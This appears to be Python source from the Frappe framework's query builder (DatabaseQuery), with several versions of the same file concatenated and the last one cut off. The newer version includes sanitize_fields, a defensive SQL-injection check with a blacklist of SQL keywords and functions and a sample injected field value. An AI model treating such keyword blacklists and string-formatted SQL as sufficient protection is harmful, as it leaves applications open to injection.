
			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):
				value = "'%s' AND '%s'" % (
					get_datetime(f.value[0]).strftime("%Y-%m-%d %H:%M:%S.%f"),
					add_to_date(get_datetime(f.value[1]),days=1).strftime("%Y-%m-%d %H:%M:%S.%f"))
				fallback = "'0000-00-00 00:00:00'"
			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif df and df.fieldtype=="Datetime":
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator in ("like", "not like") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator in ("like", "not like") and isinstance(value, basestring):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)                    
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)                    

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """ or `tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values])
					)
				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):                    
		meta = frappe.get_meta(self.doctype)                    
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):                    
		if "." in order_by:                    
			tbl = order_by.split('.')[0]                    
			if tbl not in self.tables:                    
				if tbl.startswith('`'):                    
					tbl = tbl[4:-1]                    
				frappe.throw(_("Please select atleast 1 column from {0} to sort").format(tbl))                    

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
"""build query for doclistview and return results"""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)                    
		self.check_sort_by_table(args.order_by)                    
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, basestring):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions):
		"""build conditions from user filters"""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):
				value = "'%s' AND '%s'" % (
					get_datetime(f.value[0]).strftime("%Y-%m-%d %H:%M:%S.%f"),
					add_to_date(get_datetime(f.value[1]),days=1).strftime("%Y-%m-%d %H:%M:%S.%f"))
				fallback = "'0000-00-00 00:00:00'"
			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif df and df.fieldtype=="Datetime":
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator in ("like", "not like") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator in ("like", "not like") and isinstance(value, basestring):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)                    
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)                    

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """ or `tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values])
					)
				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):                    
		meta = frappe.get_meta(self.doctype)                    
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):                    
		if "." in order_by:                    
			tbl = order_by.split('.')[0]                    
			if tbl not in self.tables:                    
				if tbl.startswith('`'):                    
					tbl = tbl[4:-1]                    
				frappe.throw(_("Please select atleast 1 column from {0} to sort").format(tbl))                    

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)                    

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''
		regex = re.compile('^.*[,();].*')                    
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)

		for field in self.fields:
			if regex.match(field):                    
				if any(keyword in field.lower() for keyword in blacklisted_keywords):                    
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() \                    
					for keyword in blacklisted_functions):                    
					_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

